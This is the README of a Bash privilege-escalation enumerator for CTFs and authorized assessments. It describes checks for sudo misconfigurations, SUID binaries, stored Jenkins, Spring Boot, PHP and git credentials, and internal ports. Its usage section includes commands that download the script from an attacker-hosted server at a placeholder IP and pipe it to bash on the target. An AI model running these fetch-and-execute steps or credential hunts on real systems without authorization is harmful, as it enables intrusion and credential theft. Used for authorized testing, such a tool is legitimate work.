# Custom-LinPEAS: Targeted Privilege Escalation Enumerator
A lightweight, targeted Bash script designed to automate Linux privilege escalation enumeration. Unlike general-purpose enumerators, this script is highly focused, targeting high-probability vectors frequently found in modern CTF challenges and real-world assessments.
It prioritizes actionable data (stored credentials, dangerous SUIDs, internal ports) over exhaustive system information, making it ideal for quick triage.
# 🚀 Features
This script performs a rapid scan of the target system looking for specific misconfigurations:
Sudo Permissions: Checks sudo -l and specifically highlights dangerous configurations like LD_PRELOAD or SSH ProxyCommand exploits.
SUID/GUID Enumeration: Filters out noise (snaps, proc) and flags Critical binaries (e.g., enlightenment, pkexec, or common GTFOBins).
Application Configs & Credentials:
Jenkins: Hunts for users.xml and credentials.xml in standard directories.
Spring Boot: Scans for application.properties containing cleartext passwords.
PHP/CMS: Looks for common configuration files like config.php or settings.php.
Git: Checks .git/config files for embedded credentials.
Custom Scripts: Enumerates /opt and checks for writable scripts in system paths that could be hijacked.
Internal Ports: Identifies services listening on 127.0.0.1 (e.g., ActiveMQ, MySQL) that are not exposed externally.
File Capabilities: Lists getcap results to identify binaries with elevated privileges.
# 📥 Installation & Usage
Since this is a single Bash script, you can run it directly on the target machine.
Method 1: The "CTF" Way (Host and Curl)
On your attack machine:
# Start a python server in the directory containing the script
python3 -m http.server 8000


On the target machine:
cd /tmp
wget http://<YOUR_IP>:8000/custom-linpeas.sh
chmod +x custom-linpeas.sh
./custom-linpeas.sh

Or using curl and piping directly to bash:
curl http://<YOUR_IP>:8000/custom-linpeas.sh | bash


Method 2: Copy and Paste
If the target has no internet access, simply copy the content of the script, paste it into a file on the target using vi or nano, and execute it.
# 🎨 Color Code Key
The output is color-coded for quick analysis:
<span style="color:red">RED</span>: Critical/Danger. Likely an exploit path (e.g., password found, dangerous SUID).
<span style="color:green">GREEN</span>: Safe/Good. Success messages or strong suggestions.
<span style="color:yellow">YELLOW</span>: Warning/Header. Sections or interesting files requiring manual review.
<span style="color:blue">BLUE</span>: Info. General system information.


⚠️ Disclaimer
This tool is created for educational purposes only and for use in authorized security assessments and CTF challenges. Do not use this tool on systems you do not have explicit permission to test. The author is not responsible for any misuse.
